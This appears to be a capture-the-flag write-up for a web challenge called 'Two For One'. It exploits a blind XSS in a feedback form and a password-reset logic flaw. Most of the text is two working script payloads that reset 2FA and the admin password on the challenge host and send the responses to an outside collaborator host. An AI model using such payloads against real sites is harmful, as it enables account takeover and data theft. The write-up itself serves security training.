## Two For One
> We all love our hacker t-shirts. Make your own custom ones.

Application vulnerable to blind xss on feedback, Logic bugs on Change password (doesnot require old password). Only require 2FA can be reset easily.
First, reset 2FA with this payload:  
```html
"><script>
    xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://challenge.nahamcon.com:31632/reset2fa', false);
    xhr.send();
    document.location='https://<burp_collaborator>/?otp='+xhr.response;
</script>
```
Second: add authenticator token and get OTP to send reset password request.  
```html
"><script>
    xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://challenge.nahamcon.com:31632/reset_password', false);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.send(JSON.stringify({"otp":"068728","password":"1","password2":"1"}));
    document.location='https://<burp_collaborator>?res='+xhr.response;
</script>
```

Login to with `admin/1` and get flag:  
![Alt text](flag.png?raw=true "Title")  